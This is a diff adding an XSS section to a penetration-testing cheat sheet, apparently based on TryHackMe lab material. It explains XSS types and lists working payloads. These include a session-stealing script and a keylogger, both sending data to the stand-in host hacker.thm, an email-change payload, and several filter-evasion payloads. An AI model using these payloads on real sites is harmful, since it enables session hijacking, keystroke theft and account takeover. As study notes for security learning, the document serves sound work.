@@ -27,6 +27,7 @@
 * [gobuster](https://github.com/OJ/gobuster): Directory/File, DNS and VHost busting tool written in Go.
 * [dnsrecon](https://www.kali.org/tools/dnsrecon/): DNS enumeration script.
 * [Sublist3r](https://github.com/aboul3la/Sublist3r): Fast subdomains enumeration tool for penetration testers.
+* [xsshunter](https://xsshunter.com/)
 
 ## F12
 * Check Network header/response
@@ -199,6 +200,40 @@ Hacker                                                             website.thm  
 
 
 ## XSS Injection
+* An injection attack where malicious JavaScript gets injected into a web application.
+* Types of XSS
+  * Reflected XSS: Attack script is reflected back to the user as part of a page from the victim site
+    1. Victim visits malicious website
+    2. Victim receives page with malicious link, ex. `http://victim.com/search.php?term=<script>...</script>`
+    3. Victim clicks on link
+    4. Victim receives page with injected scripts, ex. echo search term in response `<html>...Results for <script>...</script>`
+    5. Victim sends valuable data to attacker
+  * Stored XSS: The XSS payload is stored on the web application
+    1. Attacker uploads malicious content to victim server
+    2. Victim requests page from victim server
+    3. Victim receives page with malicious content
+    4. Victim sends valuable data to attacker
+  * DOM Based XSS: The JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code.
+    * Look for parts of the code that access certain variables that an attacker can have control over, ex. `window.location.x`
+    * Then see how they are handled and whether the values are ever written to the web page's DOM or passed to functions like `eval()`
+  * Blind XSS: Similar to a stored XSS but you can't see the payload working or be able to test against yourself first.
+    * [xsshunter](https://xsshunter.com/)
+* Payloads
+  * Proof of concept: `<script>alert('hello');</script>`
+  * Session Stealing: `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie) );</script>`
+    * `btoa()`: Creates a Base64-encoded ASCII string from a "string" or binary data.
+  * Key Logger: `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
+  * Business Logic: `<script>user.changeEmail('attacker@hacker.thm');</script>`
+  * Payload is inside other tags: `"><script>alert('hello');</script> 
+    * `<h2>Hello, <input value="test"></h2>` -> `<h2>Hello, <input value=""><script>alert('hello');</script>"></h2>`
+  * Payload is in textarea tags: `</textarea><script>alert('hello');</script>`
+    * `<h2>Hello, <textarea>test</textarea></h2>` -> `<h2>Hello, <textarea></textarea><script>alert('hello');</script></textarea></h2>`
+  * innerHTML: `';alert('hello');//`
+    * `<script>document.getElementsByClassName('name')[0].innerHTML='test'</script>` -> `<script>document.getElementsByClassName('name')[0].innerHTML='';alert('hello');//';`
+  * `script` is filterd: `<sscriptcript>alert('hello');</sscriptcript>`
+  * Escape IMG tag and `<`, `>` are filtered: `/images/cat.jpg" onload="alert('hello');`
+    * `<img src="images/cat.jpg">` -> `<img src="/images/cat.jpg" onload="alert('hello');">`
+  * Polyglots
 
 ## Command Injection
 * `ping $whoami`
